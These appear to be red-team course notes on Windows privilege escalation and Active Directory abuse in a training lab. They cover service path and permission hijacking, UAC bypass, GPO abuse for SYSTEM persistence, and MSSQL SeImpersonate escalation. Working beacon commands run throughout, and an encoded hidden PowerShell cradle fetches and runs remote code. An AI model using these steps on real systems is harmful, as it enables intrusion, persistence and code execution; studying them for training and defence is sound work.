## Windows Services

---

Check the services installed on a machine by opening `services.msc` or via the `sc` command or the Get-Service PowerShell cmdlet:
``` cmd
sc query
```

``` powershell
Get-Service | fl
```

### Properties to Pay Attention To

#### Binary Path

This is the path where the actual executable (.exe) for the service is located. Windows services are often in `C:\Windows\system32` and third party in `C:\Program Files` / `C:\Program Files (x86)`

#### Startup Type

This dictates when the service should start.

- Automatic - The service starts immediately on boot.
- Automatic (Delayed Start) - The service waits a short amount of time after boot before starting (mostly a legacy option to help the desktop load faster).
- Manual - The service will only start when specifically asked.
- Disabled - The service is disabled and won't run.

#### Service Status

This is the current status of the service.

- Running - The service is running.
- Stopped - The service is not running.
- StartPending - The service has been asked to start and is executing its startup procedure.
- StopPending - The service has been asked to stop and is executing its shutdown procedure.

#### Log On As

The user account that the service is configured to run as.

This could be a domain or local account. It's very common for these services to be run as highly-privileged accounts, even domain admins, or as local system. This is why services can be an attractive target for both local and domain privilege escalation.

#### Dependants & Dependencies

These are services that either the current service is dependant on to run, or other services that are dependant on this service to run. This information is mainly important to understand the potential impact of manipulation.

Like files and folders - services themselves (not just the .exe) have permissions assigned to them. This controls which users can modify, start or stop the service. Some highly sensitive services such as Windows Defender cannot be stopped, even by administrators. Other services may have much weaker permissions that allow standard users to modify them for privilege escalation.

After a service has been manipulated to trigger a privilege escalation, it needs to be restarted (or started if it's already stopped). There will be cases where this can be done with the management tools, if you have the required permissions. Other times, you'll need to rely on a reboot.

## Unquoted Service Paths

---

Pull a list of every service and the path to its executable with WMI:
```
run wmic service get name, pathname

Name                    PathName
ALG                     C:\Windows\System32\alg.exe
AppVClient              C:\Windows\system32\AppVClient.exe
Sense                   "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
[...snip...]
VulnService1            C:\Program Files\Vulnerable Services\Service 1.exe
```

When Windows attempts to read the path to this executable, it interprets the space as a terminator. So, it will attempt to execute the following (in order):

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Services\Service.exe`

The PowerShell `Get-Acl` cmdlet will show the permissions of various objects (including files and directories):
``` powershell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```

Or use [[SharpUp#audit UnquotedServicePath]]

Payloads to abuse services must be specific "service binaries", because they need to interact with the Service Control Manager.  When using the "Generate All Payloads" option, these have svc in the filename. Use TCP beacons bound to localhost only for privilege escalations.

```
beacon> cd C:\Program Files\Vulnerable Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe
```

```
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe
 290kb    fil     03/03/2021 11:11:27   Service.exe
```

```
beacon> run sc stop VulnService1

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

beacon> run sc start VulnService1

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4384
        FLAGS              :
```

```
beacon> run netstat -anp tcp
[...snip...]
TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
```

Connect to beacon:
```
beacon> connect localhost 4444
```

To restore the service, simply delete `Service.exe` and restart the service.

## Weak Service Permissions

---

Use [[SharpUp#audit ModifiableServices]].

[This](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) PowerShell script will print which service rights we have.

```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceACL -name VulnService2 | Select -expand access
```

We can abuse these weak permissions by changing the binary path of the service - so instead of it running `C:\Program Files\Vulnerable Services\Service 2.exe`, we can have it run something like `C:\Temp\payload.exe`.

1. Validate that the current path is `"C:\Program Files\Vulnerable Services\Service 2.exe"`:
```
beacon> run sc qc VulnService2
```
2. Upload a service binary payload and reconfigure the binary path on the vulnerable service:
```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
```
3. Validate that the path has been updated:
```
beacon> run sc qc VulnService2
```
4. Restart the service:
```
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

beacon> connect localhost 4444
```
5. Restore the previous binary path:
```
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
```


## Weak Service Binary Permissions

---

1. Verify that the binary is modifiable:
```
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
```
2. Download the binary:
```
beacon> download Service 3.exe
```
3. Make a copy of the payload and rename it to the original service binary name:
``` powershell
copy "tcp-local_x64.svc.exe" "Service 3.exe"
```
4. Attempt to upload:
```
beacon> upload C:\Payloads\Service 3.exe
```

Troubleshoot:
```
beacon> upload C:\Payloads\Service 3.exe
[-] could not upload file: 32 - ERROR_SHARING_VIOLATION
```

This seems like an ambiguous error, but it means the file is already in use.  This makes sense, since the service is running.

``` cmd
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

```
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
```


## UAC Bypasses

---

User Account Control (UAC) is a technology that exists in Windows which forces applications to prompt for consent when requesting an administrative access token.
A UAC "bypass" is a technique that allows a medium integrity process to elevate itself or spawn a new process in high integrity, without prompting the user for consent.  Being in high integrity is important for attackers because it's required for various post-exploitation actions such as dumping credentials.

Beacon has a few built-in UAC bypasses and a few more which are provided via the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) (this has already been pre-loaded into Cobalt Strike for your convenience).  These are exposed via the `elevate` command.

[[Cobalt Strike#UAC Bypass via [Elevate Kit](https //github.com/cobalt-strike/ElevateKit)]]

```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```


## Modifying Existing GPOs

---

Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario.  To search for these, we need to enumerate all GPOs in the domain with `Get-DomainGPO` and check the ACL of each one with `Get-DomainObjectAcl`.  We want to filter any for which a principal has modify privileges such as CreateChild, WriteProperty or GenericWrite, and also want to filter out the legitimate principals including SYSTEM, Domain Admins and Enterprise Admins.

```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

Let's resolve the GPO name and the SID of the principal.

```
beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
```

```
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.  GPOs are linked to an OU by modifying the `gPLink` property of the OU itself.  The `Get-DomainOU` cmdlet has a handy `-GPLink` parameter which takes a GPO GUID.

```
beacon> powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
```

Finally, to get the computers in an OU, we can use `Get-DomainComputer` and use the OU's distinguished name as a search base.

```
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
```

To modify a GPO without the use of GPMC (Group Policy Management Console), we can modify the associated files directly in SYSVOL (the gpcFileSysPath).

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
```

We can do that manually or use an automated tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse), which has several abuses built into it.

Here's an example using a Computer Startup Script.  It will put a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism).

```
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
```

Note that you can find this `software` share using PowerView:  

```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```
  
It can go in any remote location as long as it's accessible by the target computer(s)

Log into the console of Workstation 1 and run `gpupdate /force` from a Command Prompt.  Then reboot the machine.  After it starts up, the DNS Beacon will execute as SYSTEM.

SharpGPOAbuse has other functions such as adding an immediate scheduled task that you may experiment with.


## Create & Link a GPO

---

Group Policy Objects are stored in _CN=Policies,CN=System_ - principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object.  We can find these with PowerView's `Get-DomainObjectAcl` cmdlet by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names.

```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.

This is also something we can find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again.  Iterate over each one looking for instances of "WriteProperty" over "GP-Link" .

```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
```

```
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations.  The `Get-Module` cmdlet will show if they are present.

```
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

Use the `New-GPO` cmdlet to create and link a new GPO.

```
beacon> powershell New-GPO -Name "Evil GPO"
```

Some abuses can be implemented directly using RSAT.  For example, the `Set-GPPrefRegistryValue` cmdlet can be used to add an HKLM autorun key to the registry.

```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
```

Next, apply the GPO to the target OU.

```
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

Remember that HKLM autoruns require a reboot to execute.


## Gaining Access to MSSQL Servers

---

If the domain account being used to run the MSSQL Service is kerberoastable ([[Credential Theft#Kerberoasting]]), and if we can crack its plaintext password we can use it to gain access to the SQL instance. The credentials can be used with `make_token` in Beacon and `/a:WinToken` in SQLRecon; or the `/a:WinDomain` option with `/d:<domain> /u:<username> /p:<password>` in SQLRecon directly.

[[SQLRecon#Gaining Access to SQL Instance]]

Once we have access, there are several options for issuing queries against a SQL instance.  `Get-SQLQuery` from PowerUpSQL.

[[PowerUpSQL#Get-SQLQuery]]

or

[[SQLRecon#Query SQL Database]]

or `mssqlclient.py` from Impacket via proxychains:

```
proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.25:1433-<><>-OK
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-2): Line 1: Changed database context to 'master'.
[*] INFO(SQL-2): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands

SQL> select @@servername;

--------------------------------------------------------------------------------------------------------------------------------

SQL-2
```

or a Windows SQL GUI, such as [HeidiSQL](https://www.heidisql.com/) via Proxifier:

![](https://files.cdn.thinkific.com/file_uploads/584845/images/574/967/edc/heidi.png)


## MSSQL Privilege Escalation

---

We are looking for `SeImpersonatePrivilege` [[Seatbelt#TokenPrivileges]]

In a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to.  However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. SYSTEM) already running on the machine.  A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue service that the attacker creates.  This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.

```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
```

```
beacon> connect localhost 4444
```